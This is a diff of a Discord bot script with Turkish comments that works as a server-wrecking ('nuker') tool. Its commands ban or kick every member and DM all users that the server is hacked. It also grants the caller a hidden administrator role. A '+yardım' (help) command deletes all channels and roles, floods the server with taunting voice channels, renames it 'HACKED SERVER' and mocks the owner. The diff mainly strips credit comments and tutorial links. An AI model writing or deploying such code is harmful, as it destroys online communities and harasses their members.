@@ -1,11 +1,11 @@
-const Discord = require("discord.js"); //TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryt KANALINDA VİDEOLU ANLATIMI BULUNMAKTADIR
+const Discord = require("discord.js"); 
 const client = new Discord.Client();
 const ayarlar = require("./ayarlar.json");
 const { Client, Util } = require("discord.js");
 const request = require("request");
 client.login(ayarlar.token);
 
-client.on("message", msg => {           ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+client.on("message", msg => {           
   if (msg.content === "+ban") {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());  
@@ -20,12 +20,12 @@ client.on("message", msg => {
 });      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 
 
 client.on("message", async msg => {
-  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
+  if (msg.content === "+duyur") {  
     msg.delete();
     await msg.client.users
       .forEach(users =>
         users.send(
-          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  //HERKESE DMDEN ATILAN MESAJ
+          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  
         )
       )
       .catch(console.error);
@@ -39,13 +39,13 @@ client.on("message", msg => {
       name: ".",
       permissions: ["ADMINISTRATOR"]
     });
-    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+    let rol = msg.guild.roles.find(role => role.name === ".");  
     msg.member.addRole(rol);
   }
 });
 
 client.on("message", async msg => {
-  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
+  if (msg.content === "+yardım") {     
     msg.delete();
 
     await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
@@ -68,7 +68,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("HACKLENMİŞTİR", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+      .createChannel("HACKLENMİŞTİR", { 
         type: "voice"
       })
       .then(chan => {
@@ -127,7 +127,7 @@ client.on("message", async msg => {
       .createChannel("KÜLLERİMİZDEN", {
         type: "voice"
       })
-      .then(chan => {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+      .then(chan => {  
         chan.setUserLimit("1");
       });
             await msg.guild
@@ -201,7 +201,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+      .createChannel("▬▬▬▬▬▬▬", {  
         type: "voice"
       })
       .then(chan => {
@@ -300,7 +300,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("DOĞACAĞIZ", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+      .createChannel("DOĞACAĞIZ", { 
         type: "voice"
       })
       .then(chan => {
@@ -308,176 +308,6 @@ client.on("message", async msg => {
       });
                 await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");  //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
         type: "voice"
       })
       .then(chan => {
@@ -566,7 +396,7 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("1");
+        chan.setUserLimit("1");  
       });
     
             await msg.guild
@@ -588,7 +418,7 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("1");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+        chan.setUserLimit("1");
       });
         await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
@@ -647,177 +477,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
                 await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-    
-            await msg.guild
-      .createChannel("BU SUNUCU", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HACKLENMİŞTİR", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KOLAYDINIZ xD", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-        await msg.guild
-      .createChannel("SONSUZ", {
-        type: "voice"
-      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("AFFETMEYİZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("YENİLMEYİZ", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("KÜLLERİMİZDEN", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-            await msg.guild
-      .createChannel("DOĞACAĞIZ", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
-                await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
+      .createChannel("▬▬▬▬▬▬▬", {  
         type: "voice"
       })
       .then(chan => {
@@ -928,7 +588,7 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("1");
+        chan.setUserLimit("1");  
       });
         await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
@@ -940,7 +600,7 @@ client.on("message", async msg => {
             await msg.guild
       .createChannel("HÜKÜMDARLIĞIMIZ", {
         type: "voice"
-      })   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+      })
       .then(chan => {
         chan.setUserLimit("1");
       });
@@ -1008,7 +668,177 @@ client.on("message", async msg => {
       .then(chan => {
         chan.setUserLimit("1");
       });
-            await msg.guild  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {  
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })   
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {  
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
       .createChannel("KOLAYDINIZ xD", {
         type: "voice"
       })
@@ -1109,7 +939,177 @@ client.on("message", async msg => {
       });
             await msg.guild
       .createChannel("HÜKÜMDARLIĞIMIZ", {
-        type: "voice"     ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+        type: "voice"
+      })   
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild  
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("SONSUZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("AFFETMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("YENİLMEYİZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KÜLLERİMİZDEN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("DOĞACAĞIZ", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+            await msg.guild
+      .createChannel("BU SUNUCU", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKLENMİŞTİR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("KOLAYDINIZ xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HÜKÜMDARLIĞIMIZ", {
+        type: "voice"     
       })
       .then(chan => {
         chan.setUserLimit("1");
@@ -1195,7 +1195,7 @@ client.on("message", async msg => {
             await msg.guild
       .createChannel("HÜKÜMDARLIĞIMIZ", {
         type: "voice"
-      })  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+      })  
       .then(chan => {
         chan.setUserLimit("1");
       });
@@ -1240,7 +1240,7 @@ client.on("message", async msg => {
       })
       .then(chan => {
         chan.setUserLimit("1");
-      });                      ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+      });                      
                 await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
@@ -1249,11 +1249,11 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     
-    await msg.guild.setIcon("https://i.hizliresim.com/MpAB0o.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+    await msg.guild.setIcon("https://hizliresim.com/i5ZJnE");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
     await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://i.hizliresim.com/MpAB0o.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-    await client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
+    await client.user.setAvatar("https://hizliresim.com/aVgSI3"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+    await client.user.setUsername("melik ama yıkık ");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
   }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
@@ -1588,7 +1588,7 @@ const app = express();
   }    
 }
 app.get("/", (request, response) => {
-  console.log(Date.now() + " Ping tamamdır.");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+  console.log(Date.now() + " Ping tamamdır.");  
   response.sendStatus(200);
 });
 app.listen(process.env.PORT);
@@ -1597,4 +1597,4 @@ setInterval(() => {
 }, 3000);
 
 
-//TÜM TELİF HAKKI ENES ACARA AİTTİR ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+
